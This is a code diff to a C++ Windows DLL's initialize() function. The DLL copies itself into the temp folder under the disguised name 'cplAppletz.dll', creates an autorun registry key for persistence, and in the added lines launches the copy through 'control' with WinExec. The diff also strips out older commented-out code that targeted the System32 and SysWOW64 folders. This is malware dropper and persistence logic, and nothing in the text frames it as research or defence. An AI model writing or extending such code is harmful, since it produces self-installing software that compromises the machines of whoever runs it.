@@ -23,10 +23,6 @@ extern "C" __declspec(dllexport) void initialize()
     char szSystem32Path[MAX_PATH], szSysWOW64Path[MAX_PATH], szTempPath[MAX_PATH];
     
     //Get System Folder
-    /*GetWindowsDirectoryA(szWindowsPath, MAX_PATH);
-    strcpy(szSysWOW64Path, szWindowsPath);
-    strcat(szSysWOW64Path, "\\SysWOW64");
-    GetSystemDirectoryA(szSystem32Path, MAX_PATH);*/
     GetTempPathA(MAX_PATH, szTempPath);
 
 
@@ -45,15 +41,13 @@ extern "C" __declspec(dllexport) void initialize()
     
     //CopyFile and create key auto run
     char szNewFileName[MAX_PATH];
-    /*sprintf(szNewFileName, "%s\\cplAppletz.dll", szSystem32Path);
-    CopyFileA(szFilePath, szNewFileName, false);
-    CreateKeyAutoRun(szNewFileName);
-
-    sprintf(szNewFileName, "%s\\cplAppletz.dll", szSysWOW64Path);
-    CopyFileA(szFilePath, szNewFileName, false);*/
     sprintf(szNewFileName, "%s\\cplAppletz.dll", szTempPath);
     CopyFileA(szFilePath, szNewFileName, false);
     CreateKeyAutoRun(szNewFileName);
-    
+
+    //Execute command
+    char commandLine[MAX_PATH];
+    sprintf(commandLine, "control %s", szNewFileName);
+    WinExec(commandLine, SW_NORMAL);
     
 }
